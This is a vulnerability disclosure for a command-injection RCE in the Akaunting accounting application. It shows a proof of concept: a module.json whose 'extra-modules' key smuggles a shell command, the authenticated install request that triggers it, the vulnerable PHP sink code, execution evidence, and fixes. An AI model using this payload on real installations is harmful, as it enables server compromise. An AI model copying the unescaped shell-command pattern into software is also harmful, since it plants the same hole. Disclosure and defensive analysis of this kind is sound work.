### Vulnerability details

**Official website / Product:** https://akaunting.com / https://github.com/akaunting/akaunting

**Repository:** akaunting/akaunting (stars at selection: 10260)

**Vulnerability type:** RCE

**Vulnerability versions:** ≤3.3.0 (audited commit `a7a5fc790afe01c655ee039aa007b9a824d13af2`); Docker Hub `akaunting/akaunting:latest` = 3.1.21 verified on the same sinks

**Vulnerability URL / Parameter:** `POST /{company_id}/apps/install` (parent `alias` must pass `alpha_dash`); true injection is in on-disk package `module.json` **`extra-modules` object keys**

**Complex:** yes

### Verification procedure

1. `docker compose up -d` (`labs/akaunting-r1a3`, host port **18103**).
2. JSON-login as `admin@lab.local` / `Admin123!`; set company `apps.api_key` (required by `api.key` middleware on apps routes).
3. Place a minimal installable module under `modules/Labdemo2/` whose `module.json` contains:
   ```json
   "extra-modules": { "x;id>/tmp/TMP-r1a3-1-pwn;#": "required" }
   ```
4. Authenticated request:
   `POST /1/apps/install` with JSON `{"alias":"labdemo2","version":"1.0.0","name":"Labdemo2"}`.
5. Flow: `InstallModule` → `module:install labdemo2` → `Installed` event → `InstallExtraModules` reads `extra-modules` keys → `DownloadModule` interpolates into a shell command.
6. Container file `/tmp/TMP-r1a3-1-pwn` contains `uid=33(www-data)...`; log shows  
   `Console command:: 'php' 'artisan' module:download x;id>/tmp/TMP-r1a3-1-pwn;# 1`.

Vulnerability HTTP request:

```http
POST /1/apps/install HTTP/1.1
Host: 127.0.0.1:18103
X-Requested-With: XMLHttpRequest
Accept: application/json
Content-Type: application/json
X-XSRF-TOKEN: <authenticated-session-xsrf>
Cookie: akaunting_session=<authenticated-session>

{"alias":"labdemo2","version":"1.0.0","name":"Labdemo2"}
```

(Prerequisite: `modules/Labdemo2/module.json` `extra-modules` key with shell metacharacters; see evidence `module.json.poc`.)

Verification result:

- HTTP response: `{"success":true,"error":false,...,"data":{"alias":"labdemo2"}}`
- `/tmp/TMP-r1a3-1-pwn`: `uid=33(www-data) gid=33(www-data) groups=33(www-data)`
- laravel log: `module:download x;id>/tmp/TMP-r1a3-1-pwn;# 1`

### Vulnerability analysis

CVE-2022-51019-class bugs allowed the HTTP `alias` to reach `Console::run` unsanitized. Current `App\Http\Requests\Module\Install` validates request `alias` with `alpha_dash`, so request parameters can no longer carry `;`, `|`, etc.

After a successful install, `InstallCommand` dispatches `App\Events\Module\Installed`. Listener `InstallExtraModules` reads `extra-modules` from the **package** `module.json` and treats each **key** as a dependency alias: if missing locally it runs `new DownloadModule($alias, $company_id)`. `DownloadModule` has **no** `authorize()` and **no** character checks; it builds:

```php
$command = "module:download {$this->alias} {$this->company_id}";
$result = Console::run($command);
```

`Console::run` uses `Process::fromShellCommandline` without per-argument escaping, so metacharacters in the JSON key execute as the web user (www-data).

Parent alias `labdemo2` fully satisfies `alpha_dash`; injection is entirely in the JSON-derived secondary alias — an **incomplete-fix residual** of the prior alias→shell hardening.

Vulnerable trigger / sink source (complete path and line numbers):

```php
# File: app/Jobs/Install/DownloadModule.php
# Lines: 31-38
public function handle()
{
    $command = "module:download {$this->alias} {$this->company_id}";

    $result = Console::run($command);

    if ($result !== true) {
        throw new \Exception($result);
    }
}
```

```php
# File: app/Listeners/Module/InstallExtraModules.php
# Lines: 32-54
$extra_modules = module($event->alias)->get('extra-modules');
// ...
foreach ($extra_modules as $alias => $level) {
    if ($level != 'required') {
        continue;
    }
    if ($this->moduleIsEnabled($alias)) {
        continue;
    }
    try {
        if (!$this->moduleExists($alias)) {
            $this->dispatch(new DownloadModule($alias, $event->company_id));
        }
        $this->dispatch(new InstallModule($alias, $event->company_id, $event->locale));
```

```php
# File: app/Utilities/Console.php
# Lines: 12-22
public static function run($string, $timeout = 0)
{
    $command = Application::formatCommandString($string);
    // ...
    $process = Process::fromShellCommandline($command, base_path());
    $process->setTimeout($timeout);
    $process->mustRun();
```

```php
# File: overrides/akaunting/laravel-module/Commands/InstallCommand.php
# Line: 53
event(new Installed($this->alias, $this->company_id, $this->locale));
```

### Vulnerability Fix

1. Enforce `alpha_dash` or `^[a-z0-9-]+$` on every alias that reaches `Console::run` / `module:*`, including `extra-modules` keys and `UpdateExtraModules`.
2. Add shared `authorize()` character-set checks in `DownloadModule` / `InstallModule` / enable / disable / uninstall; prefer argument arrays or `Artisan::call` over a shell.
3. Validate marketplace `module.json` schema on install and reject illegal `extra-modules` keys.
